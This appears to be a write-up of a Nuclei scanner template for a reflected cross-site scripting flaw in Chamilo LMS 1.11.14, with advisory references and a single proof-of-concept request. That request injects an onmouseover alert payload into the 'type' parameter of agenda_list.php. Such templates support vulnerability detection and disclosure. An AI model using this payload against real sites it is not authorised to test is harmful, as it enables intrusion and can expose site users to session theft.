# Nuclei Template: Chamilo LMS 1.11.14 Cross-Site Scripting
**Template ID:** chamilo-lms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`chamilo-lms-xss.yaml`)

## Vulnerability Information & PoC

## Description
Chamilo LMS 1.11.14 is vulnerable to cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"
```

## References
- https://www.netsparker.com/web-applications-advisories/ns-21-001-cross-site-scripting-in-chamilo-lms/
- https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-45-2021-01-21-Moderate-impact-moderate-risk-XSS-vulnerability-in-agenda
